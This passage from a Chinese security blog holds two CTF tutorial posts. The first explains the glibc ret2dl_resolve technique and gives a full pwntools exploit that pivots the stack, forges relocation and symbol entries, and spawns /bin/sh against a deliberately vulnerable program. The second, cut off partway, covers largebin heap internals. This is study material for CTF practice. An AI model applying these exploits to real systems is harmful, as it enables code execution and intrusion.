alt="2019-07-04-194619_514x62_scrot"></p><p>在这里，程序又将一个参数压栈，然后跳转至0x804a008处，而这个地址中的函数便是_dl_runtime_resolve()函数。</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-195038_856x477_scrot.png" alt="2019-07-04-195038_856x477_scrot"></p><p>而之前压入栈中的两个参数便会作为参数供_dl_runtime_resolve()函数调用：_dl_runtime_resolve(link_map, reloc_arg)，而其中最重要的函数便是_dl_fixup函数，这里的0x20便是reloc_arg，也就是我们在漏洞利用中需要注意控制的内容。</p><p>这里0x20的含义是什么呢？这里的0x20偏移是指与.rel.plt表的偏移，readelf -S binary  可以查看ELF文件中段信息。</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-200224_829x441_scrot.png" alt="2019-07-04-200224_829x441_scrot"></p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-200101_451x43_scrot.png" alt="2019-07-04-200101_451x43_scrot"></p><p>这里的0x20的偏移处便是reloc的位置</p><p>里面两条信息，一个是write的GOT表，另一个下面分析：</p><p>查看下_dl_fixup函数的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中遇到了reloc结构体中的r_info，也就是reloc中的0x607，这里低字节的0x07表示R_TYPE，只要是7便好，而高字节的0x6则是R_SYM，是用来找到.dynsym中的条目的。这里的6代表了偏移：</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-201040_827x270_scrot.png" alt="2019-07-04-201040_827x270_scrot"></p><p>这里的write的Num为6，而找到这个地址的方法就是利用.dynsym的地址加上0x10*Num：</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-201223_766x39_scrot.png" alt="2019-07-04-201223_766x39_scrot"></p><p>这里便是write对应的符号信息，此符号信息有结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// Symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>图中的0x4c便是st_name，而0x12便对应了st_info。那么st_name为什么是个数字呢。实际上，0x4c也是一个偏移，他是相对于.dynstr段的偏移。</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-202139_357x40_scrot.png" alt="2019-07-04-202139_357x40_scrot"></p><p>最后，_dl_fixup函数会利用 <code>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</code>  最终实现调取libc中的write地址：</p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-202513_847x221_scrot.png" alt="2019-07-04-202513_847x221_scrot"></p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-202522_483x41_scrot.png" alt="2019-07-04-202522_483x41_scrot"></p><p><img src="/2020/05/09/re2dl_resolve/2019-07-04-202549_662x227_scrot.png" alt="2019-07-04-202549_662x227_scrot"></p><p>而ret2dl_resolve就是修改reloc的偏移，构造fake_reloc和fake_Elf32_Sym,使其指向任意的函数。</p><h2 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><p>现在总结下上述知识和漏洞利用方法。</p><p>_dl_runtime_resolve()通过两个参数在libc中寻找函数地址，而我们更加关注的是第二个参数也就是上面write的0x20，0x20将_dl_runtime_resolve()带到了reloc的位置，reloc中有2个重要信息，一个是函数的got表地址，另一个是r_info。r_info的高位是.dynsym中的条目，.dynsym的地址加上0x10*Num，得到函数对应的符号信息，而修改其中的st_name偏移，就可以伪造函数名称，从而实现漏洞利用，我们将其过程反过来，根据漏洞利用顺序，实现漏洞利用：</p><p>1、在一个地址上写入”system”；</p><p>2、伪造reloc，其中r_info根据.dynsym+0x10*NUM = address of(Elf32_Sym )，计算出r_info；</p><p>3、伪造Elf32_Sym ，其中st_name为.dynstr+st_name = address of(“system”)；</p><p>4、调用dl_runtime_resolve()的参数，修改其参数，使其指向伪造的reloc。</p><h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p>首先，先看一个经典的ret2dl_resolve类型题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie bof.c -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"ret2dl_resolve\n"</span>;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">        vuln();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题目开启了NX，关闭了其他保护，在没有leak函数的情况下，可以通过爆破GOT表上的libc进行漏洞利用，当然，这里就可以利用ret2dl_resolve进行漏洞利用了。根据我们上面的分析，开始构造吧</p><h3 id="在一个地址上写入”system”"><a href="#在一个地址上写入”system”" class="headerlink" title="在一个地址上写入”system”"></a>在一个地址上写入”system”</h3><p>由于我们需要一个不变的地址，所以，我们需要在bss段上填写这一数据，所以，我们将栈迁移至bss段上，这里，我们还要考虑后续还要read。</p><p>利用栈溢出，ROP，开始迁移栈，常规操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pop_ebp = <span class="number">0x080485bb</span> <span class="comment"># pop ebp ; ret</span></span><br><span class="line">ppp = <span class="number">0x080485b9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">leave = <span class="number">0x08048405</span> <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804A020</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x70</span></span><br><span class="line">payload += p32(bin.plt[<span class="string">'read'</span>]) + p32(ppp)</span><br><span class="line">payload += p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_ebp)+p32(bss)+p32(leave)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure><p>迁栈成功，我们再在bss段上写入ROP，并开始下一步工作。</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401191805952.png" alt="image-20200401191805952"></p><p>因为我们的ROP中有read函数，所以就可以在bss段中写入system。所以，我们接下来将程序流程指向plt表中的最后一条指令，即_dl_runtime_resolve()的GOT表，也就是最后一步，执行_dl_runtime_resolve()。</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401193240058.png" alt="image-20200401193240058"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">"AAAA"</span></span><br><span class="line">payload2 += p32(<span class="number">0x804835B</span>) + p32(reloc_arg)</span><br><span class="line">payload2 += (......)</span><br><span class="line">payload2 += <span class="string">'system'</span></span><br></pre></td></tr></table></figure><h3 id="伪造reloc"><a href="#伪造reloc" class="headerlink" title="伪造reloc"></a>伪造reloc</h3><p>构建reloc，第一项是read的GOT表，第二项是r_info</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reloc = p32(bin.got[<span class="string">'read'</span>])+p32(r_info)</span><br></pre></td></tr></table></figure><p>计算r_info中偏移：</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401194913781.png" alt="image-20200401194913781"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r_info = (((address of (Elf32_Sym) - <span class="number">0x80481cc</span>)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span> )+<span class="number">0x7</span></span><br></pre></td></tr></table></figure><p>伪造Elf32_Sym：</p><p>查看.dynstr位置</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401194215835.png" alt="image-20200401194215835"></p><p>之后，构造Elf32_Sym</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_name = address of (<span class="string">"system"</span>) - <span class="number">0x804824c</span></span><br><span class="line">Elf32_Sym = p32(r_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="调用dl-runtime-resolve"><a href="#调用dl-runtime-resolve" class="headerlink" title="调用dl_runtime_resolve()"></a>调用dl_runtime_resolve()</h3><p>总结一下，上述的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">r_name = address of (<span class="string">"system"</span>) - <span class="number">0x804824c</span></span><br><span class="line">Elf32_Sym = p32(r_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">r_info = (((address of (Elf32_Sym) - <span class="number">0x80481cc</span>)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span> )+<span class="number">0x7</span></span><br><span class="line">reloc = p32(bin.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = p32(<span class="number">0x804835B</span>) + p32(reloc_arg)</span><br><span class="line">payload2 += (......)</span><br><span class="line">payload2 += <span class="string">'system'</span></span><br></pre></td></tr></table></figure><p>那么只需要确认上述的几个地址即可，将其安排下去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r_name = address of (<span class="string">"system"</span>) - <span class="number">0x804824c</span></span><br><span class="line">Elf32_Sym = p32(r_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">r_info = (((address of (Elf32_Sym) - <span class="number">0x80481cc</span>)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span> )+<span class="number">0x7</span></span><br><span class="line">reloc = p32(bin.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"AAAA"</span></span><br><span class="line">payload2 += p32(<span class="number">0x804835B</span>) + p32(reloc_arg)</span><br><span class="line">payload2 += <span class="string">"AAAA"</span></span><br><span class="line">payload2 += p32(address of <span class="string">"/bin/sh"</span>)</span><br><span class="line">payload2 += reloc</span><br><span class="line">payload2 += Elf32_Sym</span><br><span class="line">payload2 += <span class="string">'system\x00'</span></span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br></pre></td></tr></table></figure><p>那么此时，system的地址为<code>bss+13*4</code>，而Elf32_Sym的地址为<code>bss+8*4</code>,/bin/sh的地址为<code>bss+13*4+7</code></p><p>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r_name = bss+<span class="number">13</span>*<span class="number">4</span> - <span class="number">0x804824c</span></span><br><span class="line">Elf32_Sym = p32(r_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">r_info = (((bss+<span class="number">8</span>*<span class="number">4</span> - <span class="number">0x80481cc</span>)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span> )+<span class="number">0x7</span></span><br><span class="line">reloc = p32(bin.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"AAAA"</span></span><br><span class="line">payload2 += p32(<span class="number">0x804835B</span>) + p32(reloc_arg)</span><br><span class="line">payload2 += <span class="string">"AAAA"</span></span><br><span class="line">payload2 += p32(bss+<span class="number">13</span>*<span class="number">4</span>+<span class="number">7</span>)</span><br><span class="line">payload2 += reloc</span><br><span class="line">payload2 += Elf32_Sym</span><br><span class="line">payload2 += <span class="string">'system\x00'</span></span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br></pre></td></tr></table></figure><p>查看.rel.plt位置</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401193504490.png" alt="image-20200401193504490"></p><p>所以reloc_arg=bss+5*4 - 0x80482f4</p><p>最后，得到全部exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################################################</span></span><br><span class="line"><span class="comment"># File Name: pwn_exp.py</span></span><br><span class="line"><span class="comment"># Author: sofr</span></span><br><span class="line"><span class="comment"># mail: sofr@foxmail.com</span></span><br><span class="line"><span class="comment"># Created Time: Wed Apr  1 10:24:12 2020</span></span><br><span class="line"><span class="comment">#########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sf = <span class="keyword">lambda</span> x,y:p.sendafter(x,y)</span><br><span class="line">slf = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">l32_addr = <span class="keyword">lambda</span> x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = <span class="keyword">lambda</span> x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./boo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process(binary)</span><br><span class="line"></span><br><span class="line">pop_ebp = <span class="number">0x080485bb</span></span><br><span class="line">ppp = <span class="number">0x080485b9</span></span><br><span class="line">leave = <span class="number">0x08048405</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804A020</span>+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x70</span></span><br><span class="line">payload += p32(bin.plt[<span class="string">'read'</span>]) + p32(ppp)</span><br><span class="line">payload += p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(pop_ebp)+p32(bss)+p32(leave)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">reloc_arg=bss+<span class="number">5</span>*<span class="number">4</span> - <span class="number">0x80482f4</span></span><br><span class="line">r_name = bss+<span class="number">13</span>*<span class="number">4</span> - <span class="number">0x804824c</span></span><br><span class="line">Elf32_Sym = p32(r_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r_info = (((bss+<span class="number">8</span>*<span class="number">4</span> - <span class="number">0x80481cc</span>)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span> )+<span class="number">0x7</span></span><br><span class="line">reloc = p32(bin.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">0x804835B</span>) + p32(reloc_arg)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(bss+<span class="number">13</span>*<span class="number">4</span>+<span class="number">7</span>)</span><br><span class="line">payload2 += reloc</span><br><span class="line">payload2 += Elf32_Sym</span><br><span class="line">payload2 += <span class="string">'system\x00'</span></span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">getshell()</span><br></pre></td></tr></table></figure><p>getshell：</p><p><img src="/2020/05/09/re2dl_resolve/image-20200401203502847.png" alt="image-20200401203502847"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>注意伪造Elf32_Sym的时候，注意0x10对齐的情况，而且，单纯的bss段头无法满足之后函数执行的栈空间需要，所以要加0x800</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>文章首发于freebuf</p><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 《程序员的自我修养——链接、装载与库》 7.4节</p><p>[2] <a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
            <tag> ret2dl_resolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin attack</title>
      <link href="/2020/04/02/LargebinAttack/"/>
      <url>/2020/04/02/LargebinAttack/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>把以前学过的东西再复习总结一下，温故而知新。<br>由于相较其他heap，largebin 中的机制相对复杂，所以largebin attack 一直是CTF的堆漏洞利用常规而少见的一种，但是却一直活着人们的心中。<br>关键字： <code>CTF</code> <code>pwn</code> <code>堆溢出</code> <code>largebin</code> <code>largebin attack</code> </p><a id="more"></a><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>我们以64位，libc 2.27为例，其实与2.23差不多，只不过2.27中，0x420以下堆块会进入tcache，但是2.23中0x400就能进入largebin了</p><p><img src="/2020/04/02/LargebinAttack/image-20200402092305156.png" alt="image-20200402092305156"></p><p><img src="/2020/04/02/LargebinAttack/image-20200402092336545.png" alt="image-20200402092336545"></p><p>开始介绍large bin的相关机制。在此之前，请学习堆的申请与释放等相关知识。</p><h3 id="largebin-从哪里来"><a href="#largebin-从哪里来" class="headerlink" title="largebin 从哪里来"></a>largebin 从哪里来</h3><p>在堆的机制中，free掉的chunk会进入bin，如果此chunk的大小大于fastbin，free后就会先进unsorted bin，之后，再次申请更大堆块，unsorted bin无法满足，heap就会进入large bin，那么large bin的范围是多少呢？</p><p>源码告诉我们一切：</p><p><img src="/2020/04/02/LargebinAttack/image-20200402092622322.png" alt="image-20200402092622322"></p><p>源码中可以看到，MIN_LARGE_SIZE是（64 - 0）*0x10 = 0x400，也就是最小的large bin。这里的MALLOC_ALIGNMENT其实等于SIZE_SZ，即系统位数乘以2，64位系统即 0x8乘以2=0x10，32位为0x4乘以2=0x8。</p><p>也就是说我们可以申请0x400的chunk，然后free掉进unsorted bin ，之后申请更大chunk，就可以将0x400的堆放入largebin。</p><p><strong>注意</strong>:此时，我们使用的是libc 2.27，所以，其实0x400到不了largebin，而是tcache的范围，所以，在libc 2.27中，一般使用0x420，但是如果可以将0x400的tcache填满，也是可以申请到largebin的</p><p>那么large bin 的index如何确定呢，这里，系统采取了相对于fastbin和smallbin更加粗犷的方式：</p><p><img src="/2020/04/02/LargebinAttack/image-20200402094851272.png" alt="image-20200402094851272"></p><p>large bin采取了分段的存储，比如第一个范围就是0x400到(48&lt;&lt;6)，即0x400到0xc00，而其中，每个链表之间大小差为(1&lt;&lt;6)=0x40，结果如下表：</p><table><thead><tr><th>index</th><th>size范围</th></tr></thead><tbody><tr><td>64</td><td>[0x400,0x440) 相差0x40</td></tr><tr><td>65</td><td>[0x440,0x480)相差0x40</td></tr><tr><td>……</td><td>……相差0x40</td></tr><tr><td>96</td><td>[0xc00,0xc40)相差0x40</td></tr><tr><td>97</td><td>[0xc40,0xe00)相差0x1c0</td></tr><tr><td>98</td><td>[0xe00,0x1000)相差0x200</td></tr><tr><td>……</td><td>……相差0x200</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><h3 id="largebin-的内部"><a href="#largebin-的内部" class="headerlink" title="largebin 的内部"></a>largebin 的内部</h3><p>因为largebin，一个bin内部并不是一个size，所以需要<code>fd_nextsize</code>与<code>bk_nextsize</code>将其串起来。</p><p>那么largebin内部是如何布置的呢：</p><p>首先<code>fd_nextsize</code>指向比他小的最大heap，而<code>bk_nextsize</code>指向比他大的最小的heap，最后将两条链条首尾相连。而<code>fd</code>和<code>bk</code>和其原来的任务一样，都是指向和其大小相同的堆块。<br>那么，画个草图：</p><p><img src="/2020/04/02/LargebinAttack/image-20200402111701002.png" alt="image-20200402111701002"></p><p>那么如果bin里的大小都一样的话，那么第一个释放的堆块作为此bin链的链首（这个和fastbin和tcache都不一样），<code>fd_nextsize</code>与<code>bk_nextsize</code>都指向自己,其余的大小相同的堆块free的时候,<code>fd_nextsize</code>与<code>bk_nextsize</code>就都为0了。</p><p>而<code>fd</code>和<code>bk</code>与原本作用一样,指向上一个释放的堆块,但是,这里的链头始终为第一个释放的chunk。</p><p>做个小实验,申请4个堆块ABCD,AB大小为0x450,CD大小为0x460,如下图:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402113438934.png" alt="image-20200402113438934"></p><p>其堆块如下:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402114125282.png" alt="image-20200402114125282"></p><p>将其释放至unsorted bin,释放顺序为A B D C:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402114259052.png" alt="image-20200402114259052"></p><p>之后我们申请0x470堆块,此时unsorted bin无法满足,将ABCD放入large bin:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402113600182.png" alt="image-20200402113600182"></p><p><img src="/2020/04/02/LargebinAttack/image-20200402113624719.png" alt="image-20200402113624719"></p><p>此时largebin内由<code>fd</code>和<code>bk</code>组成的链为:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402114704005.png" alt="image-20200402114704005"></p><p>此时的<code>fd_nextsize</code>与<code>bk_nextsize</code>:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402113741504.png" alt="image-20200402113741504"></p><p>最后的示意图即:</p><p><img src="/2020/04/02/LargebinAttack/image-20200402115110172.png" alt="image-20200402115110172"></p><p>那么large bin 